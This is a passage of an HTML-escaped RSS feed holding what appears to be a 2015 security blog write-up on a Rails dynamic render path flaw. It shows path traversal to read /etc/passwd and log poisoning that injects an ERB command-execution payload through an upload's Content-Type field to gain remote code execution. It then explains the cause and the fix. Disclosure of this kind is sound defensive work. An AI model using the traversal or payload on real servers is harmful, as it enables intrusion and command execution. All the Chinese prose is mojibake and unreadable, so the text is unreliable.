&lt;p&gt;ÁÑ∂ËÄåÔºåÁï∂ÊàëÂÄëÂòóË©¶ÈÄÅÂá∫Á≥ªÁµ±ÁµïÂ∞çË∑ØÂæë‰æãÂ¶Ç /etc/passwd &lt;sup id=&quot;fnref:note2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;ÔºåÁ∂≤È†ÅÁ´üÁÑ∂ÂêêÂá∫‰∫Ü /etc/passwd ÁöÑÂÖßÂÆπÔºÅÈÄôÂ∞±ÊòØ‰πãÂâçÊâÄËø∞ÁöÑÁõ¥Êé•Â≠òÂèñÁâ©‰ª∂ÂïèÈ°åÔºåÂèØ‰ª•ÈÅçÊ≠∑ÁõÆÈåÑÁÄèË¶ΩÊ™îÊ°à„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_file_traversal.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_file_traversal.png&quot; alt=&quot;Rails render Insecure Direct Object References&quot; title=&quot;Rails render Insecure Direct Object References&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;ÈÄ≤ÈöéÊîªÊìä&quot;&gt;ÈÄ≤ÈöéÊîªÊìä&lt;/h3&gt;

&lt;p&gt;ÈÄöÂ∏∏Âú® Rails Áí∞Â¢É‰∏ãËÉΩÂ§†ËÆÄÂèñ‰ªªÊÑèÊ™îÊ°àÔºåÊîªÊìäËÄÖÊúÉÂÑ™ÂÖàÂ∞ãÊâæ secret_tokenÔºåÁõÆÁöÑÊòØËÆäÈÄ†ÊÉ°ÊÑè session cookie Âà©Áî® Marshal serialize ÁöÑÂïèÈ°åÂÅö &lt;a href=&quot;http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/&quot;&gt;RCE&lt;/a&gt;„ÄÇÁÑ∂ËÄåÂú®Êú¨Ê°à‰æãÁ≥ªÁµ±‰ΩøÁî®‰∫Ü Rails 4.1 ÂæåÁöÑÁâàÊú¨ÔºåRails 4.1 È†êË®≠‰ΩøÁî®‰∫Ü JSON-based ÁöÑ serializer Èò≤Ê≠¢‰∫Ü‰πãÂâçÁöÑ RCE ÂïèÈ°åÔºåÊâÄ‰ª•‰∏¶Ê≤íÊúâËæ¶Ê≥ïËºïÈ¨ÜÂà©Áî®„ÄÇ&lt;/p&gt;

&lt;p&gt;ÁÇ∫‰∫ÜÂèñÂæóÁ≥ªÁµ±Êìç‰ΩúÊ¨äÔºåÊàëÂÄëÂòóË©¶Â∞ãÊâæÂÖ∂‰ªñÂèØÂà©Áî®ÁöÑÂú∞Êñπ„ÄÇÂú®ÈÄôÈÇäÊàëÂÄëÁôºÁèæ‰∫ÜË©≤Á´ôÁ≥ªÁµ± production.log ‰∏≠Â≠òÂú® AWS ÁöÑ‰∏äÂÇ≥Á¥ÄÈåÑ„ÄÇÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# log/production.log&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AWS&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;S3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.041347&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:acl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:public_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:bucket_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xxxx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;image/png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&amp;lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&amp;gt;,:key=&amp;gt;&quot;upload_001&quot;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ÊñºÊòØÊàëÂÄëÂèØ‰ª•Âà©Áî®‰∏äÂÇ≥Ê™îÊ°àÁöÑ Content-Type ÂÖßÂÆπÔºåÂ∞á Embedded Ruby Ë™ûÂè• &amp;lt;%=`#{params[:devcore]}`%&amp;gt; Ê∑ªÂä†Âà∞ production.log Ê™îÊ°àË£°Èù¢„ÄÇÊñºÊòØ log ÁöÑÂÖßÂÆπËÆäÊàê‰∫Ü‰∏ãÈù¢ÈÄôÊ®£Ôºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# log/production.log&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AWS&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;S3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.041347&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:acl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:public_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:bucket_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xxxx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;image/png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&amp;lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&amp;gt;,:key=&amp;gt;&quot;upload_001&quot;)&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AWS&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;S3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.040211&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:acl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:public_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:bucket_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xxxx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;%=`&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:devcore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`%&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&amp;lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&amp;gt;,:key=&amp;gt;&quot;upload_002&quot;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Êé•ËëóÔºåÊàëÂÄëÂ∞±ÂèØ‰ª•Âà©Áî®ÂâçÈù¢ÁöÑÂº±ÈªûËÆÄÂèñ production.log Ê™îÊ°àÔºåÂÜçÂ∏∂‰∏ÄÂÄã devcore ÂèÉÊï∏‰ΩúÁÇ∫Êåá‰ª§ÔºåÂ¶ÇÂúñÔºåÊàêÂäüÂèñÂæóÁ≥ªÁµ±Êìç‰ΩúÊ¨ä :p&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_RCE.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_RCE.png&quot; alt=&quot;Rails render Remote Code Execution&quot; title=&quot;Rails render Remote Code Execution&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;È¢®Èö™ÂéüÂõ†&quot;&gt;È¢®Èö™ÂéüÂõ†&lt;/h3&gt;

&lt;p&gt;‰∏ÄËà¨‰æÜË™™ Rails ÈñãÁôº‰∏¶‰∏çÂ§™ÊúÉÈÄôÊ®£ÂØ´Ôºå‰ΩÜÁ®çÂæÆÊêúÂ∞ã‰∏Ä‰∏ã Github ÈÇÑÊòØËÉΩÁôºÁèæÈÄôÁ®ÆÂØ´Ê≥ïÂ≠òÂú®‰∏Ä‰∫õÂ∞àÊ°à‰∏≠„ÄÇÊàëÊÉ≥‰∏ªË¶ÅÂéüÂõ†Â§öÂçäÊòØÈñãÁôºËÄÖÊÉ≥Ë¶ÅÂÅ∑Êá∂ÔºåÁÑ∂Âæå‰πüÂèØËÉΩÊÉ≥Ë™™ÂãïÊÖãÊ®£ÊùøË∑ØÂæëÈ†ÇÂ§öÂ∞±Ë¢´ÁúãÂà∞Èù¢ÊùøÁöÑ htmlÔºåÁÑ°ÂÇ∑Â§ßÈõÖ„ÄÇË™∞Áü•ÈÅìÂ∞±Âõ†ÁÇ∫ÈÄôÊ®£Â∞éËá¥Êï¥ÂÄãÁ®ãÂºèÁ¢ºÂÖßÂÆπË¢´ËÆÄÂèñ„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëã•Êúâ‰∏ÄÂÄã action Ë¶ÅÂãïÊÖãÈ°ØÁ§∫‰∏çÂêåÊ®°ÁâàÁöÑÈúÄÊ±ÇÔºåÁÇ∫‰∫ÜÈÅøÂÖç‰∏äËø∞ÁöÑÂïèÈ°åÔºåÂ∞±ËæõËã¶ÈªûÂÖàÁî® case‚Ä¶when ÂéªÂà§Êñ∑Âêß„ÄÇÈÄôË∑ü‰∏çË¶ÅÁî®Â≠ó‰∏≤ÁµÑ SQL Ë™ûÂè•ÈÅøÂÖç SQL injection ‰∏ÄÊ®£ÔºåÈÄôÁ®ÆÂ§ñÈù¢ÂÇ≥ÈÄ≤‰æÜÁöÑÂèÉÊï∏ÈÉΩË¶ÅË¨πÊÖéËôïÁêÜÁöÑËßÄÂøµË¶ÅÂÖßÂåñÂú®ÈñãÁôº‰∏≠„ÄÇ&lt;/p&gt;

&lt;p&gt;Èô§‰∫ÜÈñãÁôºËÄÖÂü∫Êú¨‰∏ä‰∏çÊáâË©≤ÈÄôÊ®£ÈñãÁôºÂ§ñÔºåRails Êú¨Ë∫´‰πüÊúâ‰∏ÄÈªûÈªûÂïèÈ°åÔºåÁï∂ render Ë∑ØÂæëÊ≤íÊúâÂâØÊ™îÂêçÔºåÁÑ°Ê≥ïÂà§Êñ∑‰ªÄÈ∫ºÊ†ºÂºèÊôÇÔºåÂ∞±ÊúÉÁõ¥Êé•Êé°Áî®È†êË®≠ÁöÑ template handler„ÄÇ&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# lib/action_view/template/resolver.rb&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;extract_handler_and_format_and_variant&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_formats&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;shift&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;unless&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;The file &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; did not specify a template handler. The default is currently ERB, &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
              &lt;span class=&quot;s2&quot;&gt;&quot;but will change to RAW in the future.&quot;&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;ActiveSupport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Deprecation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;warn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;handler_for_extension&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;variant&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;last&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EXTENSIONS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:variants&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;last&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;variant&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ËÄåÈÄôË£°È†êË®≠ÁöÑ handler ÊòØ ERBÔºàË¶ã register_default_template_handlerÔºâÔºåÊâÄ‰ª•ÊúâÊú¨ÁØáÂæåÈù¢ÊèêÂà∞ÁöÑÈÄ≤ÈöéÊîªÊìäÔºåÂèØ‰ª•Ë¢´Âà©Áî®‰æÜ RCE„ÄÇ&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# lib/action_view/template/handlers.rb&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;extended&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;register_default_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:erb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ERB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;register_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:builder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Builder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;register_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;register_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:ruby&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_proc&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ÊÖ∂Âπ∏ÁöÑÊòØÔºåÁõÆÂâç Rails Â∑≤Á∂ìÊääÈ†êË®≠ÁöÑ template handler Âæû ERB ÊîπÊàê RAWÔºå‰∏çÊúÉËºïÊòìÊääË¶Å render ÁöÑÊ™îÊ°àÁï∂Êàê ERB Âü∑Ë°å‰∫Ü„ÄÇË©≥Á¥∞ÁöÑÂÖßÂÆπË´ãÂèÉËÄÉÈÄôÂÄã &lt;a href=&quot;https://github.com/rails/rails/commit/4be859f0fdf7b3059a28d03c279f03f5938efc80&quot;&gt;commit&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÁµêË´ñ&quot;&gt;ÁµêË´ñ&lt;/h3&gt;

&lt;p&gt;Ruby on Rails ËÉΩËÆìÈñãÁôºËÄÖËºÉËºïÈ¨ÜÁöÑÈñãÁôºÂá∫ÂÆâÂÖ®ÁöÑÊáâÁî®Á®ãÂºèÔºåÁÑ∂ËÄåÔºåËã•ÈñãÁôºËÄÖ‰∏çÊ≥®ÊÑèÔºåÈÇÑÊòØÊúâÂèØËÉΩÂØ´Âá∫Âö¥ÈáçÁöÑÊºèÊ¥û„ÄÇÊú¨ÊñáÁöÑÂãïÊÖãÊ®£ÊùøË∑ØÂæëÂ∞±ÊòØÈÄôÊ®£‰∏ÄÂÄã‰æãÂ≠êÔºåÂÆÉ‰∏çÂè™ÊòØ OWASP ÊâÄÊèèËø∞ÁöÑÂèØ‰ª•Â≠òÂèñ‰ªªÊÑèÊ®°ÁâàËÄåÂ∑≤ÔºåÂÆÉÂèØ‰ª•ÈÅçÊ≠∑Ê™îÊ°àÔºåÁîöËá≥Âõ†ÁÇ∫ rails È†êË®≠ÁöÑ template handler ÊòØ ERBÔºåÈÄ†ÊàêÈÅ†Á´ØÂëΩ‰ª§Âü∑Ë°åËÆìÊîªÊìäËÄÖÂèñÂæó‰º∫ÊúçÂô®Êìç‰ΩúÊ¨ä„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôÂÄã‰æãÂ≠êÂèàÂÜçÊ¨°È©óË≠âÔºåÊ°ÜÊû∂ÂèØ‰ª•Âπ´Âä©Â§ßÂÆ∂Âø´ÈÄüÈñãÁôºÔºåÂ¢ûÂä†ÂÆâÂÖ®Â∫¶„ÄÇ‰ΩÜÂîØÊúâËâØÂ•ΩÁöÑÂÆâÂÖ®ÊÑèË≠òÔºåÊâçÊòØÊáâÁî®Á®ãÂºèÂÆâÂÖ®ÁöÑÂü∫Áü≥„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Ë®ªËß£&quot;&gt;Ë®ªËß£&lt;/h3&gt;

&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note1&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;Dynamic Render Paths ÁõÆÂâç‰∏¶Ê≤íÊúâ‰∏≠ÊñáÁøªË≠ØÔºåÂõ†ÁÇ∫ÂïèÈ°å‰πãÁ≤æÈ´ìÂú®ÊñºË¶ÅÁî¢ÁîüÁöÑÊ®£ÊùøË∑ØÂæëÊòØÂèØËÆäÂãïÁöÑÔºåÂõ†Ê≠§Á≠ÜËÄÖË™çÁÇ∫ÂãïÊÖãÊ®£ÊùøË∑ØÂæëÈÄôÂÄãÁøªË≠ØËºÉÁÇ∫Ë≤ºÂàá„ÄÇ¬†&lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note2&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;Á≠ÜËÄÖÊ∏¨Ë©¶ÁöÑÁí∞Â¢ÉÁÇ∫ Rails 4.1.4ÔºåÂÖ∂‰ªñ Rails ÁâàÊú¨ÊúâÂèØËÉΩÈúÄË¶ÅÁî® ../../../../../etc/passwd Ë∑≥ËÑ´ÁõÆÂâçÁõÆÈåÑ„ÄÇ¬†&lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2015/07/24/the-vulnerability-of-dynamic-render-paths-in-rails/</link>
                <guid>https://devco.re/blog/2015/07/24/the-vulnerability-of-dynamic-render-paths-in-rails</guid>
                <pubDate>Fri, 24 Jul 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Ë´á Cookie Ë™çË≠âÂÆâÂÖ®Ôºç‰ª•ÂÆèÁ¢ÅÈõ≤Á´ØÂîÆÁ•®ÁÇ∫‰æã</title>
                <description>&lt;h3 id=&quot;ÂâçË®Ä&quot;&gt;ÂâçË®Ä&lt;/h3&gt;

